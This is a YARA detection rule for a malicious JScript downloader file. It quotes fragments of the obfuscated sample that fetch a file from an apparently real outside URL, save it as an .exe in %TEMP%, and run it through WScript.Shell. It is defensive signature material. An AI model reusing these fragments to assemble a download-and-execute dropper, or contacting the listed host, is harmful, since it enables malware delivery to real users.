rule sig_20160328_bd8ceffc2579972667157cb1879434fb {
  meta:
    description = "datamaliciousorder - file 20160328_bd8ceffc2579972667157cb1879434fb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9fc609efe3b72f32f202e6a2e5e8b208e6a6c2dc5004df39f21e3de5bbc310f6"

  strings:
    $s1  = "Skgufynwuw[Kkbnoeloga](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s2  = "function Nsviy() {return Jeqjm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"doSTnTHc.exe\";};" fullword ascii
    $s3  = "do {WScript[Mhfwmooicj](Lykleacq() * 11)} while (Skgufynwuw[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ohilauvk(Kdlimjgd, Wckfamxb){return Kdlimjgd - Wckfamxb;};" fullword ascii
    $s5  = "var Jeqjm = function Yjruof() {return WScript[Vkwnw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Uhpvjrqlq(Wznqnx){Jeqjm[\"Run\"](Wznqnx, Xzxrgegx, Xzxrgegx);};" fullword ascii
    $s7  = "function Wnszizo() {return ((Gugilknqq == true) && (Gugilknqq == Gmndunu)) ? 1 : Xzxrgegx;};" fullword ascii
    $s8  = " while (Wwesgpurv){" fullword ascii
    $s9  = "function Vxuwxwwwzn(){return Ftduzerxaq;};" fullword ascii
    $s10 = "function Lctptq(Riwneiedv) {var Cmfvkubdtt = (1, 2, 3, 4, 5, Riwneiedv); return Cmfvkubdtt;};" fullword ascii
    $s11 = "return Ohilauvk(Whipyq, Yeeowqf);" fullword ascii
    $s12 = "var Gmndunu = false;" fullword ascii
    $s13 = "var Xkyzlokjzg = new this[\"Date\"]();" fullword ascii
    $s14 = "function Ocrpui()" fullword ascii
    $s15 = "function Lykleacq(){return 22;};" fullword ascii
    $s16 = "Gugilknqq = true; " fullword ascii
    $s17 = "function Qobhocehq(){return Vkwnw;};" fullword ascii
    $s18 = "var Gugilknqq = false;" fullword ascii
    $s19 = "var Hjtjxuc = false;" fullword ascii
    $s20 = "Gmndunu = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}